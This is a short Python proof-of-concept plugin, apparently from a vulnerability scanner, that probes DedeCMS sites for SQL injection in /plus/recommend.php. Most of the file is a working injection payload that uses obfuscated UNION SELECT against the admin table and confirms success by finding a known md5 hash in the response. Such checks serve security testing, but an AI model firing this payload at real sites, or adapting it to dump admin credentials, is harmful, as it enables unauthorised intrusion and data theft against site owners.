#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'Ario'

def assign(service, arg):
    if service == "dedecms":
        return True, arg

def audit(arg):
    url = arg
    _, head, body, _, _ = curl.curl(url + '/plus/recommend.php?aid=1&_FILES[type][name]&_FILES[type][size]&_FILES[type][type]&_FILES[type][tmp_name]=aa%5c%27and+char(@`%27`)+/*!50000Union*/+/*!50000SeLect*/+1,2,3,md5(0x40776562736166657363616E40),5,6,7,8,9%20from%20`%23@__admin`%23')
    if body and body.find('2e0e20673083dea5cc87a85d54022049') != -1:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('dedecms', 'http://www.example.com/')[1])
